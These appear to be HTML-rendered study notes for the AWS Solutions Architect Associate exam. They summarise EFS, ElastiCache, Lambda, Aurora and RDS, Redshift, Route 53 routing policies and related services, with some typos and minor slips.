<h2 id="deregistration-delay"><a class="header" href="#deregistration-delay">Deregistration Delay</a></h2>
<ul>
<li>AKA Connection Draining</li>
<li>Stop sending new requests to the instance that is being deregistered</li>
<li>Allows the instance to complete in-flight requests before being terminated</li>
<li>1 to 3600 seconds (default 300 seconds)</li>
<li>Can be disabled (set to 0 seconds)</li>
<li>Set to a low value if your requests are short-lived</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-file-system-efs-1"><a href="#elastic-file-system-efs-1" class="header">Elastic File System (EFS)</a></h1>
<ul>
<li><a href="#elastic-file-system-efs">Elastic File System (EFS) </a></li>
<li><a href="#introduction-to-elastic-file-system-efs">Introduction to ELastic File System (EFS)</a></li>
</ul>
<h2 id="elastic-file-system-efs"><a class="header" href="#elastic-file-system-efs">Elastic File System (EFS)</a></h2>
<ul>
<li><i><ins>Scalable, elastic, <b> Cloud-Native NFS File System</b></ins></i></li>
<li>Attach a single file system to multiple EC2 Instances</li>
<li>Don‚Äôt worry about running out or managing disk space</li>
</ul>
<h2 id="introduction-to-elastic-file-system-efs"><a class="header" href="#introduction-to-elastic-file-system-efs">Introduction to Elastic File System (EFS)</a></h2>
<ul>
<li>EFS is a file storage service for EC2 instances</li>
<li>Storage capacity grows (upto petabytes) and shrinks automatically based on data stored (elastic)</li>
<li><ins> Multiple EC2 instances </ins> in same VPC can mount a single EFS Volume (Volume must be in same VPC)</li>
<li>EC2 instances install the NFSv4.1 client and can then mount the EFS volume</li>
<li>EFS is using Network File System version 4 (NFSv4) protocol</li>
<li>EFS creates multiple <b><ins> mount targets </ins></b> in all your VPC subnets</li>
<li>Pay only for the storage you use, starting at $0.30 GB / month</li>
<li>You create a security group to control access to EFS</li>
<li>Encryption at rest using KMS</li>
<li>1000s of concurrent NFS clients, 10 GB+ /s throughput</li>
<li>Grow to petabyte scale storage</li>
</ul>
<h2 id="efs-performance-settings"><a class="header" href="#efs-performance-settings">EFS Performance Settings</a></h2>
<ul>
<li>Performance Mode
<ul>
<li>General Purpose (Default) - latency sensitive use cases</li>
<li>Max IO - higher latency, throughput, highly parallel</li>
</ul>
</li>
<li>Throughput Mode:
<ul>
<li>Bursting - 1 TB storage = 50 MB/s + burst up to 100 MB/s</li>
<li>Enhanced - Provides more flexibility and higher throughput levels for workloads with a range of performance requirements
<ul>
<li>Provisioned - set your throughput regardless of storage size</li>
<li>Elastic - scale throughput up and down based on workload. Useful for unpredictable workloads</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="efs-storage-tiers"><a class="header" href="#efs-storage-tiers">EFS Storage Tiers</a></h2>
<ul>
<li>Standard</li>
<li>Infrequent (EFS-IA)</li>
<li>Archive</li>
<li>Implement lifecycle policies to move files between tiers</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-elasticache-for-redis-1"><a href="#what-is-elasticache-for-redis-1" class="header">What is ElastiCache for Redis?</a></h1>
<ul>
<li><a href="#what-is-elasti-cache">What is ElastiCache for Redis?</a></li>
<li><a href="#comparing-memcached-and-redis">Comparing Memcached and Redis</a></li>
<li><a href="#authenticating-with-redis-auth-command">Authenticating with Redis AUTH command</a></li>
</ul>
<h2 id="what-is-elasticache-for-redis"><a class="header" href="#what-is-elasticache-for-redis">What is ElastiCache for Redis?</a></h2>
<ul>
<li>ElastiCache is a web service that makes it easy to set up, <i><ins> manage and scale a distributed in-memory data store or cache environment </ins></i> in the cloud.</li>
<li>Features:
<ul>
<li>Automatic detection of and recovery from cache node failures</li>
<li><b> Multi-AZ </b>for a failed primary cluster to a read replica in Redis cluster</li>
<li>Redis (cluster mode enabled) supports partitioning your data across up to 500 shards</li>
</ul>
</li>
<li>ElastiCache works with both the Redis and Memcached engines.</li>
</ul>
<h2 id="comparing-memcached-and-redis"><a class="header" href="#comparing-memcached-and-redis">Comparing Memcached and Redis</a></h2>
<ul>
<li>
<p>Redis supports:</p>
<ul>
<li>Multi-AZ with Auto-Failover</li>
<li>Read replicas</li>
<li>data durability using AOF persistence</li>
<li>Backup and restore feautres</li>
<li>Supports sets and sorted sets
<ul>
<li>Sorted sets guarantees both uniqueness and element ordering. Useful when creating something like a gaming leaderboard. Each time a new element is added, its ordered automatically.</li>
</ul>
</li>
<li>Supports IAM for authentication</li>
</ul>
</li>
<li>
<p>Memcached support:</p>
<ul>
<li>None of what Redis supports</li>
<li>Supports SASL based authentication</li>
</ul>
</li>
</ul>
<h2 id="authenticating-with-redis-auth-command"><a class="header" href="#authenticating-with-redis-auth-command">Authenticating with Redis AUTH command</a></h2>
<ul>
<li>Users enter a token (password) on a token-protected Redis server.</li>
<li>Include the parameter <code>--auth-token</code> (API: <ins>AuthToken</ins>) with the correct token to create the replication group or cluster.</li>
<li>Key Parameters:
<ul>
<li><i><ins> <code>--engine</code> </ins></i> - Must be redis</li>
<li><i><ins> ‚Äìengine-version </ins></i> - Must be 3.2.6,4.0.10 or later</li>
<li><i><ins> ‚Äìtransit-encryption-enabled </ins></i> - Required for authentication and HIPAA eligibility</li>
<li><i><ins> ‚Äìauth-token </ins></i> - Required for HIPAA eligibility. This value must be correct token for this token-protected Redis-server</li>
<li><i><ins> ‚Äìcache-subnet-group </ins></i> - Required fro HIPAA eligibility</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="glue-cheatsheet"><a href="#glue-cheatsheet" class="header">Glue-cheatsheet</a></h1>
<ul>
<li>
<p>A fully managed service to extract, transform and load (ETL) your data for analytics</p>
</li>
<li>
<p>Discover and search across different AWS data sets without moving your data</p>
</li>
<li>
<p>AWS Glue retrieves data from sources and writes data to targets stored and transported in various data formats</p>
<ul>
<li>If your data is stored or transported in Parquet data format, this document introduces you available features for using your data in AWS Glue</li>
</ul>
</li>
<li>
<p>AWS glue consists of</p>
<ul>
<li>Central metadata repository</li>
<li>ETL engine</li>
<li>Flexible scheduler</li>
</ul>
</li>
<li>
<p>Use Cases:</p>
<ul>
<li>Run queries against an Amazon S3 data lake
<ul>
<li>You can use AWS Glue to make your data available for analytics without moving your data</li>
</ul>
</li>
<li>Analyze the log data in your data warehouse
<ul>
<li>Create ETL transcripts to transform, flatten and enrich the data from source to target</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Integration with AWS Glue</p>
<ul>
<li>To create database and table schema in the AWS Glue Data Catalog, you can run an AWS Glue crawler from within Athena on a data source, or you can run Data Definition Language (DDL) queries directly in the Athena Query Editor.</li>
<li>Then, using the database and table schema that you created, you can use Data Manipulation (DML) queries in Athena to query the data.</li>
</ul>
</li>
<li>
<h2 id="set-up-aws-glue-crawlers-using-s3-event-notifications"><a class="header" href="#set-up-aws-glue-crawlers-using-s3-event-notifications">Set up AWS Glue Crawlers using S3 event notifications</a></h2>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-lambda-1"><a href="#aws-lambda-1" class="header">AWS Lambda</a></h1>
<ul>
<li><a href="#aws-lambda">AWS Lambda</a></li>
<li><a href="#how-it-works">How it works</a></li>
<li><a href="#file-processing-architecture">File Processing Architecture</a></li>
<li><a href="#stream-processing-architecture">Stream Processing Architecture</a></li>
<li><a href="#use-cases-2">Use Cases</a></li>
</ul>
<hr>
<h2 id="aws-lambda"><a class="header" href="#aws-lambda">AWS Lambda</a></h2>
<hr>
<ul>
<li>Run code <ins> without thinking about servers or clusters</ins></li>
<li>Run code without provisioning or managing infrastructure. Simply write and <i> <ins> upload code as a .zip file or container image</ins></i></li>
<li>Automatically respond to code execution requests at any scale, from a dozen events per day to hundreds of thousands per second</li>
<li>Save costs by <ins><b> paying only for the compute time you use </b></ins> by per millisecond instead of provisioning infrastructure upfront for peak capacity</li>
<li>Optimize code execution time and performance with the right function memory size. Respond to high demand in double-digit milliseconds with Provisioned Concurrency.</li>
</ul>
<hr>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<hr>
<ul>
<li>AWS Lambda is a <ins><b> serverless, event-driven compute service that lets you run code for virtually any type of application </b> or backend service without provisioning or managing servers.</ins></li>
<li>You can trigger Lambda over 200 AWS services and software as a service (Saas) applications and only pay for what you use</li>
</ul>
<hr>
<h2 id="file-processing-architecture"><a class="header" href="#file-processing-architecture">File Processing Architecture</a></h2>
<hr><img src="clouds/aws/saa-c03/images/Lambda/file-processing.jpg" width="60%" height="40%" />
<hr>
<h2 id="stream-processing-architecture"><a class="header" href="#stream-processing-architecture">Stream Processing Architecture</a></h2>
<hr><img src="clouds/aws/saa-c03/images/Lambda/stream-processing.jpg" width="60%" height="40%" />
<hr>
<h2 id="use-cases-2"><a class="header" href="#use-cases-2">Use Cases</a></h2>
<hr>
<ul>
<li>Quickly process data at scale
<ul>
<li>Meet resource-intensive and unpredictable demand by using AWS Lambda to instantly scale out to more than 18K vCPUs.</li>
<li>Build processing workflows quickly and easily with suite of other serverless offerings and event triggers</li>
</ul>
</li>
<li>Run interactive web and mobile backends</li>
<li>Enable powerful ML insights</li>
<li>Create event-driven applications</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ml-models"><a href="#ml-models" class="header">Ml-models</a></h1>
<ul>
<li><a href="#">Sage Maker</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-amazon-quicksight--1"><a href="#what-is-amazon-quicksight--1" class="header">What is Amazon QuickSight ?</a></h1>
<ul>
<li><a href="#what-is-amazon-quicksight">What is Amazon QuickSight ? </a></li>
<li><a href="#benefits">Benefits</a></li>
</ul>
<hr>
<h2 id="what-is-amazon-quicksight-"><a class="header" href="#what-is-amazon-quicksight-">What is Amazon QuickSight ?</a></h2>
<hr>
<ul>
<li>Amazon Quicksight is a <ins><b> very fast, easy-to-use, cloud -powered business analytics  service </b> that makes it easy for all employees within an organization to <i><ins>build visualizations, perform ad-hoc analysis, and quickly get business insights </ins> from their data, anytime on any device.</i></ins></li>
<li><b> <ins>1/10th</ins> </b> the cost of traditional BI Solutions</li>
<li>With QuickSight all users can meet varying analytic needs from the same source of truth through <ins> <b> modern interactive dashboards, paginated reports, embedded analytics and natural language queries </b></ins></li>
</ul>
<hr>
<h2 id="benefits"><a class="header" href="#benefits">Benefits</a></h2>
<hr>
<ul>
<li><b> Pay only for what you use</b></li>
<li>Scale to tens of thousands of <ins> users</ins></li>
<li>Easily embed analytics to differentiate your applications</li>
<li>Enable BI for everyone with QuickSight Q</li>
<li>Can get data insights in minutes from AWS services (e.g. Redshift, RDS, Athena, S3)</li>
<li>Can choose QuickSight to keep the data in SPICE up-yo-date as the data in the underlying sources change</li>
<li><b>SPICE </b>:
<ul>
<li>Amazon QuickSight is built with SPICE -<ins><i> a super-fast, parallel, In-memory calculation Engine. </i></ins></li>
<li>SPICE uses a combination of <ins> columnar storage, in-memory technologies </ins> enabled through the latest hardware innovations and machine code generation to run interactive queries on large datasets and get rapid responses</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aurora-cheatsheet-1"><a href="#aurora-cheatsheet-1" class="header">Aurora Cheatsheet</a></h1>
<hr>
<h2 id="aurora-cheatsheet"><a class="header" href="#aurora-cheatsheet">Aurora Cheatsheet</a></h2>
<hr>
<ul>
<li>When you need a fully-managed Postgres or MySQL database that needs to scale, automate backups, high availability and fault tolerance think Aurora</li>
<li>Aurora can run MySQL or Postgres database engines</li>
<li>Aurora <ins> MySQL is <b> 5x</b> faster </ins>over regular MySQL</li>
<li>AUrora <ins> Postgres is <b> 3x </b> faster</ins> over regular Postgres</li>
<li>Aurora is <i> 1/10 </i> the cost over its competitors with similar performance and availability options</li>
<li>Aurora replicates <b> <ins> 6 copies </ins> </b> for your database across <b> <ins> 3 availability zones </ins></b></li>
<li>Aurora is allowed up to <b> <ins> 15 Aurora Replicas </ins></b></li>
<li>An Aurora database can span multiple regions via Aurora Global Database</li>
<li>Aurora Serverless allows you to stop and start Aurora and scale automatically while keeping costs low</li>
<li>Aurora Serverless is ideal for new projects or projects with infrequent database usage</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rds-2"><a href="#rds-2" class="header">RDS</a></h1>
<ul>
<li><a href="#rds-1">RDS</a></li>
<li><a href="#rds-proxy-1">RDS Proxy</a></li>
<li><a href="#aurora-1">Aurora</a></li>
<li><a href="#introduction-to-aurora">Introduction to Aurora</a></li>
<li><a href="#aurora-availability">Aurora Availability</a></li>
<li><a href="#fault-tolerance-and-durability">Fault Tolerance and Durability</a></li>
<li><a href="#aurora-replicas">Aurora Replicas</a></li>
<li><a href="#aurora-serverless">Aurora Serverless</a></li>
</ul>
<h2 id="rds-1"><a class="header" href="#rds-1">RDS</a></h2>
<ul>
<li>Relational Database Service</li>
<li>Database service for database engines that use SQL as a query language</li>
<li>Engines:
<ul>
<li>Postgresql</li>
<li>Mysql / Mariadb</li>
<li>Oracle</li>
<li>MSSQL</li>
<li>IBM DB2</li>
<li>Aurora (Proprietary AWS Relational Database)</li>
</ul>
</li>
<li>You cannot access the underlying compute instances for RDS unless you are using RDS Custom
<ul>
<li>RDS Custom supports Oracle and Microsoft SQL Server</li>
</ul>
</li>
<li>RDS scales storage automatically
<ul>
<li>You have to set the Maximum Storage Threshold (max amount of storage to use)</li>
<li>Supports all RDS engines</li>
</ul>
</li>
</ul>
<h3 id="read-replicas-1"><a class="header" href="#read-replicas-1">Read Replicas</a></h3>
<ul>
<li>Scale out read operations</li>
<li>Create up to 15 read replicas within the same AZ or across AZ‚Äôs or across regions</li>
<li>Replication is asynchronous</li>
<li>You can promote a read-replica to it‚Äôs own database capable of full writes</li>
<li>Network Costs
<ul>
<li>If the read replicas is in the same region, there is no cost for replication traffic</li>
<li>For cross-region replication traffic, there is a cost</li>
</ul>
</li>
<li>You can setup read-replicas as Multi-AZ for fault tolerance</li>
</ul>
<h3 id="rds-multi-az"><a class="header" href="#rds-multi-az">RDS Multi-AZ</a></h3>
<ul>
<li>Mainly used for disaster recovery</li>
<li>synchronous replication to a standby database</li>
<li>One DNS name for both databases with automatic failover</li>
<li>Multi-AZ replicas cannot be read or written to until they are promoted to the primary instance</li>
<li>Converting from single-AZ to multi-AZ requires no downtime. This can be done in the ‚Äúmodify‚Äù section of the RDS database
<ul>
<li>A snapshot is taken and restored into a new standby database. Then a full sync of the database is initiated.</li>
</ul>
</li>
</ul>
<h3 id="rds-proxy-1"><a class="header" href="#rds-proxy-1">RDS Proxy</a></h3>
<ul>
<li>Fully managed database proxy for RDS</li>
<li>Allows apps to pool and share DB connections established with the database</li>
<li><ins><i>Improving database efficiency by reducing the stress on database resources (e.g CPU, RAM)and minimize open connections (and timeouts)</i></ins></li>
<li>Serverless, autoscaling, highly available (multi-AZ)</li>
<li>Reduced RDS and Aurora failover time by up 66%</li>
<li>Supports RDS (MySQL,PostgreSQL, MariaDB, MS SQL Server) and Aurora (MySQL, PostgreSQL)</li>
<li>No code changes required for most apps</li>
<li><i>Enforce <ins>IAM authentication </ins> for DB, and securely store credentials in <ins>AWS Secrets Manager</ins></i></li>
<li>RDS proxy is <ins>never publicly accessible</ins></li>
<li>RDS Proxy is useful for highly scaling lambda functions that open database connections</li>
</ul>
<img src="clouds/aws/saa-c03/images/Aurora/rds-proxy.jpg" width="47%" />
<h3 id="rds-backups"><a class="header" href="#rds-backups">RDS Backups</a></h3>
<ul>
<li>Daily full backup of the database</li>
<li>Transaction logs are backed up every 5 minutes</li>
<li>1 to 35 days of backup retention, set to 0 to disable</li>
</ul>
<h2 id="aurora-1"><a class="header" href="#aurora-1">Aurora</a></h2>
<ul>
<li>Fully managed Postgres or MySQL compatible database designed by default to scale and fine-tuned to be really fast</li>
<li>Aurora <strong><ins>automatically grows in increments of 10GB, up to 128 TB</ins></strong></li>
<li>5x performance over MySQL, 3x performance over Postgres</li>
</ul>
<h3 id="introduction-to-aurora"><a class="header" href="#introduction-to-aurora">Introduction to Aurora</a></h3>
<ul>
<li>Combines the speed and availability of high-end databases with the simplicity and cost-effectiveness of open source databases</li>
<li>Aurora can run either MySQL or Postgres compatible engines</li>
<li>Aurora MYSQL is <ins> 5x better performance </ins> than traditional MySQL</li>
<li>Aurora Postgres is <ins>3x better performance </ins> than traditional Postgres</li>
<li><ins>Aurora Costs more than RDS (20% more) but is more efficient</ins></li>
</ul>
<h3 id="aurora-availability"><a class="header" href="#aurora-availability">Aurora Availability</a></h3>
<ul>
<li>6 copies of your data in 3 AZ:
<ul>
<li>Needs only <ins>4 out of 6 copies for writes</ins> (so if one AZ is down then it is fine)</li>
<li>Need only <ins> 3 out of 6 for reads</ins></li>
<li>self healing with peer-to-peer replication</li>
<li>Storage is striped across 100s of volumes</li>
</ul>
</li>
<li>Automated failover for master happens in less than 30 seconds</li>
<li>Master + up to 15 Aurora Read Replicas serve reads. You can autoscale the read replicas. Clients connect to the ‚ÄúReader Endpoint‚Äù, which will point to any of the read instances</li>
</ul>
<img src="clouds/aws/saa-c03/images/Aurora/ha-aurora.jpg" width="47%" />
<img src="clouds/aws/saa-c03/images/Aurora/db-cluster.jpg" width="47%" />
<h3 id="fault-tolerance-and-durability"><a class="header" href="#fault-tolerance-and-durability">Fault Tolerance and Durability</a></h3>
<ul>
<li>
<p>Aurora Backup and Failover is handled <ins> automatically</ins></p>
</li>
<li>
<p>Aurora has a feature called Backtrack that allows you to restore to any point in time without restoring from backups</p>
</li>
<li>
<p><ins> Snapshots of data </ins> can be <b> shared </b> with other AWS accounts</p>
   <img src="clouds/aws/saa-c03/images/Aurora/aurora-fault-tolerance.jpg" width="47%" />
</li>
<li>
<p>Storage is <ins> self-healing </ins>, in that data blocks and disks are continuously scanned for errors and repaired automatically</p>
</li>
</ul>
<h3 id="aurora-replicas"><a class="header" href="#aurora-replicas">Aurora Replicas</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th></th><th>Amazon Aurora Replicas</th><th>Mysql Read Replicas</th></tr>
</thead>
<tbody>
<tr><td>Number of Replicas</td><td>Up to 15</td><td>Up to 5</td></tr>
<tr><td>Replication Type</td><td>Asynchronous(ms)</td><td>Asynchronous (s)</td></tr>
<tr><td>Performance impact on primary</td><td>Low</td><td>High</td></tr>
<tr><td>Act as failover target</td><td>Yes (no data loss)</td><td>Yes (potentially minutes of data loss)</td></tr>
<tr><td>Automated failover</td><td>Yes</td><td>No</td></tr>
<tr><td>Support for user-defined replication delay</td><td>No</td><td>Yes</td></tr>
<tr><td>Support for different data or schema vs primary</td><td>No</td><td>Yes</td></tr>
</tbody>
</table>
</div>
<h3 id="aurora-serverless"><a class="header" href="#aurora-serverless">Aurora Serverless</a></h3>
<ul>
<li>Aurora except the database will automatically start up, shut down, and scale capacity up or down based on your application‚Äôs needs</li>
<li>Apps used a few minutes several times per day or week, eg. low-volume blog site</li>
<li>pay for database storage and the database capacity and I/O your database consumes while it is active</li>
</ul>
<h3 id="aurora-backups"><a class="header" href="#aurora-backups">Aurora Backups</a></h3>
<ul>
<li>1 to 35 days rention</li>
<li>Cannot be disabled</li>
<li>Point in time recovery</li>
<li>Manual snaphots
<ul>
<li>Retain manually created snapshots for any amount of time</li>
</ul>
</li>
</ul>
<h3 id="aurora-database-cloning"><a class="header" href="#aurora-database-cloning">Aurora Database Cloning</a></h3>
<ul>
<li>Clone an existing Aurora database into a new database</li>
<li>Uses copy-on-write, so it‚Äôs very fast</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="amazon-redshift-1"><a href="#amazon-redshift-1" class="header">Amazon Redshift</a></h1>
<ul>
<li><a href="#amazon-redshift">Amazon Redshift</a></li>
<li><a href="#what-is-data-warehouse">What is Data Warehouse ?</a></li>
<li><a href="#introduction-to-redshift">Introduction to Redshift</a></li>
<li><a href="#redshift-use-case">Redshift Use Case</a></li>
<li><a href="#redshift-columnar-storage">Redshift Columnar Storage</a></li>
<li><a href="#redshift-configurations">Redshift Configurations</a></li>
</ul>
<hr>
<h2 id="amazon-redshift"><a class="header" href="#amazon-redshift">Amazon Redshift</a></h2>
<hr>
<ul>
<li>Fully managed <b> <ins> Petabyte-size Data warehouse </ins></b>.</li>
<li>Analyze (Run complex SQL queries) on massive amounts of data Columnar Store database</li>
</ul>
<hr>
<h2 id="what-is-data-warehouse--1"><a class="header" href="#what-is-data-warehouse--1">What is Data Warehouse ?</a></h2>
<hr>
<ul>
<li><b> What is Data Warehouse  ?</b>
<ul>
<li>A transaction symbolizes unit of work performed within a database management system</li>
<li>eg. reads and writes</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Database</th><th>Data warehouse</th></tr>
</thead>
<tbody>
<tr><td>Online Transaction Processing (OLTP)</td><td>Online Analytical Processing (OLAP)</td></tr>
<tr><td>A database was built to store current transactions and enable fast access to specific transactions for ongoing business processes</td><td>A data warehouse is built to store large quantities of historical data and enable fast, complex queries across all the data</td></tr>
<tr><td>Adding Items to your Shopping List</td><td>Generating Reports</td></tr>
<tr><td>Single Source</td><td>Multiple Source</td></tr>
<tr><td>Short transactions (small and simple queries ) with an emphasis on writes.</td><td>Long transactions (long and complex queries ) with an emphasis on reads</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="introduction-to-redshift"><a class="header" href="#introduction-to-redshift">Introduction to Redshift</a></h2>
<hr>
<ul>
<li>AWS Redshift is the AWS managed, petabyte-scale solution for <ins> Data Warehousing </ins></li>
<li>Pricing starts at just <ins> $0.25 per hour </ins> with no upfront costs or commitments.</li>
<li>Scale up to petabytes for $1000 per terabyte , per year</li>
<li>Redshift price is less than 1/10 cost of most similar services</li>
<li>Redshift is used for Business Intelligence</li>
<li>Redshift uses <ins> OLAP (Online Analytics Processing System)</ins></li>
<li>Redshift is <b> <ins> Columnar Storage Database  </ins> </b></li>
<li>Columnar Storage for database tables is an important factor in optimizing analytic query performance because it <ins> drastically reduces the overall disk I/O requirements </ins> and reduces the amount of data you need to load from disk</li>
</ul>
<hr>
<h2 id="redshift-use-case"><a class="header" href="#redshift-use-case">Redshift Use Case</a></h2>
<hr>
<ul>
<li>
<p>We want to continuously COPY data from</p>
<ol>
<li>EMR</li>
<li>S3 and</li>
<li>DynamoDB</li>
</ol>
<ul>
<li>to power a customer Business Intelligence tool</li>
</ul>
</li>
<li>
<p>Using a third-party library we can connect and query Redshift for data.</p>
  <img src="clouds/aws/saa-c03/images/RedShift/redshift-usecase.jpg" width="47%" />
</li>
</ul>
<hr>
<h2 id="redshift-columnar-storage"><a class="header" href="#redshift-columnar-storage">Redshift Columnar Storage</a></h2>
<hr>
<ul>
<li>
<p>Columnar Storage stores data together as columns instead of rows</p>
  <img src="clouds/aws/saa-c03/images/RedShift/columnar-storage.jpg" width="47%" />
</li>
<li>
<p>OLAP applications look at multiple records at the same time. You save memory because you fetch just the columns of data you need instead of whole rows</p>
</li>
<li>
<p>Since data is stored via column, that means all data is of the same data-type allowing for easy compression</p>
</li>
</ul>
<hr>
<h2 id="redshift-configurations"><a class="header" href="#redshift-configurations">Redshift Configurations</a></h2>
<hr>
<ul>
<li><b> Single Node </b>
<ul>
<li>Nodes come in sizes of 160Gb. You can launch a single node to get started with Redshift</li>
</ul>
</li>
<li><b> Multi-Node </b>
<ul>
<li>You can launch a cluster of nodes with Multi Node mode</li>
</ul>
</li>
<li><b> Leader Node </b>
<ul>
<li>Manages client connections and receiving</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dns-3"><a href="#dns-3" class="header">DNS</a></h1>
<ul>
<li><a href="#dns">DNS</a></li>
<li><a href="#records-ttl">Records TTL</a></li>
<li><a href="#cname-vs-alias-1">CNAME vs Alias</a></li>
<li><a href="#routing-policies-1">Routing Policies</a></li>
<li><a href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></li>
</ul>
<h2 id="dns"><a class="header" href="#dns">DNS</a></h2>
<hr>
<ul>
<li>Domain Name System which translates the human friendly hostnames into the machine IP addresses.</li>
<li>www.google.com =&gt;172.217.18.36
<img src="clouds/aws/saa-c03/images/Route53/DNS.jpg" width="57%" /></li>
<li>Any zone costs 50 cents/month</li>
<li>Public vs Private hosted zones</li>
</ul>
<h2 id="records-ttl"><a class="header" href="#records-ttl">Records TTL</a></h2>
<hr>
<ul>
<li>TTL - Time to live</li>
<li>High TTL - e.g. 24 hr
<ul>
<li>less traffic on Route 53</li>
<li>Possibly outdated records</li>
</ul>
</li>
<li>Low TTL - e.g. 60s
<ul>
<li>More traffic on Route 53 ($$)</li>
<li>Records are outdated for less time</li>
<li>Easy to change records</li>
</ul>
</li>
</ul>
<img src="clouds/aws/saa-c03/images/Route53/ttl.jpg" width="57%" />
<ul>
<li>Except for Alias records, TTL is mandatory for each DNS record</li>
</ul>
<h2 id="cname-vs-alias-1"><a class="header" href="#cname-vs-alias-1">CNAME vs Alias</a></h2>
<hr>
<ul>
<li>AWS resources (Load Balancer, CLoudFront..) expose an AWS hostname:
<ul>
<li>lb l-1234.us-east-2.elb.amazonaws.com and you want myapp.mydomain.com</li>
</ul>
</li>
<li>CNAME:
<ul>
<li>Points a hostname to any other hostname (app.domain.com =&gt; blabla.anything.com)</li>
<li>You cannot create a CNAME for the Apex record (root domain)</li>
</ul>
</li>
<li>Alias:
<ul>
<li>Points a hostname to an AWS Resource (app.mydomain.com =&gt; blabla.amazonaws.com)</li>
<li><ins>WORKS for ROOT DOMAIN and NON ROOT DOMAIN (aka, mydomain.com)</ins></li>
<li>Free of charge</li>
<li>Native health check</li>
<li>Only supported for A and AAAA record types</li>
<li>Cannot set alias for an EC2 instance name</li>
</ul>
</li>
</ul>
<h2 id="routing-policies-1"><a class="header" href="#routing-policies-1">Routing Policies</a></h2>
<hr>
<ul>
<li>
<p><strong>Simple</strong></p>
<ul>
<li>Typically, the simple type of routing policy will resolve to a single resource</li>
<li>If the record resolves to multiple values, the client will choose a random one</li>
<li>When using the Alias record type, the record can only resolve to one resource</li>
</ul>
</li>
<li>
<p><strong>Weighted</strong></p>
<ul>
<li><strong><ins>Control the % of the requests that go to each specific resource.</ins></strong></li>
<li>Assign each record a relative weight
<ul>
<li>$ \text traffic {(%)} = {\displaystyle \text {weight for a specific record } \over \displaystyle \text {sum of all the weights for all records }} $</li>
<li>The sum of the weights of all records does not need to equal 100</li>
</ul>
</li>
<li>DNS records must have the same name and type</li>
<li>Can be associated with Health Checks</li>
<li>Use cases: load balancing between regions, testing new application versions<br><img src="clouds/aws/saa-c03/images/Route53/weighted-routing-policy.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong>Latency </strong></p>
<ul>
<li><ins>Redirect to the resource that has the <strong> least latency </strong>close to us </ins></li>
<li>Super helpful when latency for users is a priority</li>
<li>Latency is based on traffic between users and AWS Regions</li>
<li>Germany users may be directed to the US (if that‚Äôs the lowest latency)</li>
<li>Can be associated with Health Checks (has a failover capability)</li>
</ul>
</li>
<li>
<p><strong>Failover</strong>
<img src="clouds/aws/saa-c03/images/Route53/failover.jpg" width="57%" /></p>
</li>
<li>
<p><strong>Geolocation</strong></p>
<ul>
<li>Different from latency based</li>
<li><strong><i><ins>This routing is based on user location </ins></i></strong></li>
<li>Should <strong>create a ‚ÄúDefault‚Äù record </strong>(in case there‚Äôs no match on location)</li>
<li>Use cases: website localization, restrict content distribution, load balancing</li>
<li>Can be associated with Health Checks
<img src="clouds/aws/saa-c03/images/Route53/geolocation.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong> Geoproximity </strong></p>
<ul>
<li><strong><ins>Route traffic to your resources based on the location of users and resources </ins></strong></li>
<li>Ability to <ins>shift more traffic to resources based on the <strong>defined bias</strong></ins>
<img src="clouds/aws/saa-c03/images/Route53/geoproximity.jpg" width="57%" /></li>
<li>To change the size of the geographic region, specify bias values:
<ul>
<li>To expand (1 to 99)- more traffic to the resource</li>
<li>To shrink (-1 to 99)- less traffic to the resource
<img src="clouds/aws/saa-c03/images/Route53/geoproximity-higher-bias.jpg" width="57%" /></li>
</ul>
</li>
<li>Resources can be:
<ul>
<li>AWS resources (specify AWS region)</li>
<li>Non-AWS resources (specify Latitude and Longitude)</li>
</ul>
</li>
<li>You must use Route 53 Traffic Flow to use this feature</li>
</ul>
</li>
<li>
<p>Health Checks</p>
<ul>
<li>HTTP Health Checks are only for public resources. You must create a CloudWatch Metric and associate a CloudWatch Alarm, then create a Health Check that checks the alarm</li>
<li>15 global health checkers</li>
<li>Health checks methods:
<ul>
<li>Monitor an endpoint
<ul>
<li>Healthy/unhealthy threshold - 3 (default)</li>
<li>Interval 30 seconds</li>
<li>Supports HTTP, HTTPS, and TCP</li>
<li>if &gt; 18% of health checkers report the endpoint is healthy, Route53 considers it healthy.</li>
<li>You can choose which locations you want Route53 to use</li>
<li>You must configure the firewall to allow traffic from the health checkers</li>
</ul>
</li>
<li>Calculated Health Checks
<ul>
<li>Combine the results of multiple health checks into a single health check</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1"><a class="header" href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></h2>
<hr>
<ul>
<li>An S3 bucket that is configured to host a static website
<ul>
<li>You can route traffic for a domain and its subdomains, such as example.com and www.example.com to a single bucket.</li>
<li>Choose the bucket that has the same name that you specified for Record name</li>
<li>The name of the bucket is the same as the name of the record that you are creating</li>
<li>The bucket is configured as a website endpoint</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="iam-1"><a class="header" href="#iam-1">IAM</a></h1>
<h2 id="groups"><a class="header" href="#groups">Groups</a></h2>
<ul>
<li>Groups can only contain users, not other groups</li>
</ul>
